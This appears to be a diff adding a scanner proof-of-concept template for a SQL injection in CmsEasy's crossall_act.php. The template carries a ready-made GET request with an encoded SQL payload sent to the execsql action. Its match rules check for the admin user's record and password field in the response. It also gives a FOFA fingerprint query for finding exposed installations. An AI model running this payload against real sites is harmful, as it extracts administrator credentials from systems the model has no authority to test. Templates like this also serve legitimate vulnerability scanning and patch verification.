@@ -1,0 +1,24 @@
+id: poc-yaml-cmseasy-crossall-act-php-sqli
+info:
+  name: CmsEasy crossall_act.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: cmseasy
+  fofa: body="cmseasyedit"
+requests:
+- method: GET
+  path: /?case=crossall&act=execsql&sql=Ud-ZGLMFKBOhqavNJNK5WRCu9igJtYN1rVCO8hMFRM8NIKe6qmhRfWexXUiOqRN4aCe9aUie4Rtw5
+  expression: 'status_code == 200
+
+    && contains(body,"\"userid\":\"1\"")
+
+    && contains(body,"\"username\":\"admin\"")
+
+    && contains(body,"password")
+
+    && contains(body,"\\u7ba1\\u7406\\u5458")
+
+    '
+variables: {}
+transport: http
